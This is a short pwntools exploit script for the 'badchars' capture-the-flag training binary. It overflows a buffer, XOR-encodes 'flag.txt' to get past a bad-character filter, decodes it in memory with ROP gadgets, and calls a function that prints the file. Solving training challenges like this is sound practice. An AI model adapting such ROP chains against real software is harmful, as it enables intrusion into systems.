import pwn
from pwn import *

p = process("./badchars")
context.binary = "badchars"

rop = b"A"*40 # offset 
rop += p64(0x000000000040069c) # pop r12,13,14,15
rop += p64(0x767a762c65636e64) # txt.galf xored by 2 and converted to hex
rop += p64(0x0000000000601038) # bss write address
rop += p64(1) #filling out remaining registers with random integer value
rop += p64(1) 
rop += p64(0x0000000000400634) # mov qword  write gadget
for i in range(8): # looping through the 8 characters 
     rop += p64(0x00000000004006a0) # pop r14,15
     rop += p64(2) # the value to xor with
     rop += p64(0x0000000000601038+i) # bss address which contains the xored string which needs to be converted back
     rop += p64(0x0000000000400628) # the xor gadget

rop += p64(0x00000000004006a3) #pop rdi
rop += p64(0x0000000000601038) # calling pop rdi with the reconverted flag.txt(reversed) after bypassing the badchars check 
rop += p64(0x400510) # address of the print file function

p.sendline(rop)
p.interactive()
